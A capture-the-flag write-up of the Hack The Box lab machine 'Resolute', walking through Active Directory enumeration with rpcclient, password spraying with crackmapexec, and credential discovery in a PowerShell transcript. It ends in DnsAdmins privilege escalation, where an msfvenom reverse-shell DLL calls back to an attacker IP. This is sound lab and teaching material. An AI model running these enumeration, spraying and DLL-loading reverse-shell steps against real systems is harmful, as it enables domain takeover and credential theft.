---
layout: post
title: HTB Machine - Resolute
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/4c86a642ea237dfde036963e6d182b40.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/4c86a642ea237dfde036963e6d182b40.png
share-img: https://www.hackthebox.com/storage/avatars/4c86a642ea237dfde036963e6d182b40.png
tags: [ HTB, Hack the Box, Network,Vulnerability Assessment,Active Directory,Security Tools,Authentication,Metasploit,Reconnaissance,Password Spraying,Weak Credentials,
Clear Text Credentials,Group Membership,Information Disclosure,Anonymous/Guest Access]
---

##### we try to enumerate users and group domains
```bash
rpcclient -U "" 10.10.10.169 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users.txt

rpcclient -U "" 10.10.10.169 -N -c "enumdomgroups" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]'
Enterprise Read-only Domain Controllers
Domain Admins
Domain Users
Domain Guests
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Group Policy Creator Owners
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
DnsUpdateProxy
Contractors
```
##### we can check the members of the admin group with the rid and then check who is that member.
```bash
rpcclient -U "" 10.10.10.169 -N -c "querygroupmem 0x200"
	rid:[0x1f4] attr:[0x7]
	
rpcclient -U "" 10.10.10.169 -N -c "queryuser 0x1f4"
	(snip) Administrator
```
##### we try to get a TGT but it is not possible.
```bash
/home/rickybana/.local/bin/GetNPUsers.py -no-pass -usersfile users.txt megabank.local/
[-] User Administrator doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ryan doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User marko doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User sunita doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User abigail doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User marcus doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User sally doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User fred doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User angela doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User gustavo doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User ulf doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User stevie doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User claire doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User paulo doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User steve doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User annette doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User annika doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User per doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User claude doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User melanie doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User zach doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User simon doesn\'t have UF_DONT_REQUIRE_PREAUTH set
[-] User naoki doesn\'t have UF_DONT_REQUIRE_PREAUTH set
```

##### There is a password for a user when displaying the info
```bash
rpcclient -U "" 10.10.10.169 -N -c "querydispinfo"
(snip)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
(snip)
```
##### We try to winrm and smb with the cred marko:Welcome123! but it didnt work so we are going to spray that password to other users and see.
```bash
crackmapexec smb 10.10.10.169 -u users.txt -p Welcome123! --continue-on-success
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
```
###### we found valid credentials 
```bash
crackmapexec smb 10.10.10.169 -u melanie -p Welcome123!
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
```
##### we can winrm with it and find the first flag.
```bash
crackmapexec winrm 10.10.10.169 -u 'melanie' -p 'Welcome123!'
SMB         10.10.10.169    5985   RESOLUTE         [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.10.10.169    5985   RESOLUTE         [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)

evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
```
##### We check privileges, nothing intersting. Check the folders present in users too and there is ryan, but we cannot access the folder. We can check net privileges as well.
```bash
whoami /all
(snip)
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

C:\Users\ryan> dir
Access to the path 'C:\Users\ryan' is denied.

net user melanie
(snip)
Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
(snip)

net user ryan
Local Group Memberships
Global Group memberships     *Domain Users         *Contractors
```
##### we will need to check what the contractors groups can do. In the meantime if we see around the directories there is nothing that peaks our interest. However we are not able to see all hidden folders, so we need to check for those too and that way we find an interesting folder that is not usually present (PSTranscripts) and a file.
```bash
dir -Force
    Directory: C:\PSTranscripts\20191203
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```
##### the file contains a password for the user ryan.
```bash
ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```
##### validate those credentials with crackmapexec and gain access via winrm. Note: it says that is pwned for some strange reason but the user is not admin. 
```bash
crackmapexec winrm 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
SMB         10.10.10.169    5985   RESOLUTE         [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.10.10.169    5985   RESOLUTE         [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)

evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
```
##### When checking privileges we see the user is part of Dnsadmins group.
```bash
whoami /all
(snip)
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
(snip)
```
##### Enumerate the groups and check the localgroup and the particular group. With the 3 following commands.
```bash
net group
net localgroup 
net localgroup DnsAdmins
```
##### same as GTFObins for linux there is LOLBAS for windows. Go to https://lolbas-project.github.io/# website and search for dns. We are gonna run a command in the target that will download a malicious dll, the service will need to be stopped and then started to download. We craft the dll with msfvenom, place our nc listener, and create an smb shared folder. We are going to use rlwrap (install with apt if needed) so we have other features.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f dll -o pwned.dll

sudo rlwrap nc -nlvp 443

/home/rickybana/.local/bin/smbserver.py smbFolder $(pwd) -smb2support
```
##### We are ready then to execute the command and then stop/start the service.
```bash
dnscmd.exe /config /serverlevelplugindll \\10.10.14.4\smbFolder\pwned.dll

sc.exe stop dns

sc.exe start dns
```
##### we should get a console now with privilege access.
```bash
C:\Windows\system32>whoami 
whoami 
nt authority\system
```
